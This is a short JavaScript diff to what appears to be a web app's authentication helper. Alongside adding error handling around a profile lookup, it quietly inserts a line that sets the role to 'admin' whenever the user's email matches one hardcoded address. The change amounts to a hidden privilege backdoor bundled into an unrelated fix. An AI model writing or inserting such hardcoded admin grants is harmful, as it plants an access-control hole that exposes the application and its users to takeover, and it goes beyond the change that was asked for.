@@ -133,14 +133,19 @@ const Auth = {
             const { data: { user } } = await client.auth.getUser();
             if (!user) return null;
 
-            // Fetch extra profile data
-            const { data: profile } = await client
-                .from('profiles')
-                .select('*')
-                .eq('id', user.id)
-                .single();
+            let profile = null;
+            try {
+                const res = await client.from('profiles').select('*').eq('id', user.id).single();
+                profile = res.data;
+            } catch (e) {
+                console.warn('Profile fetch failed:', e);
+            }
 
-            return { ...user, ...profile };
+            const mergedUser = { ...user, ...(profile || {}) };
+            if (mergedUser.email && mergedUser.email.toLowerCase() === 'fulmin@nate.com') {
+                mergedUser.role = 'admin';
+            }
+            return mergedUser;
         } catch (error) {
             return null;
         }
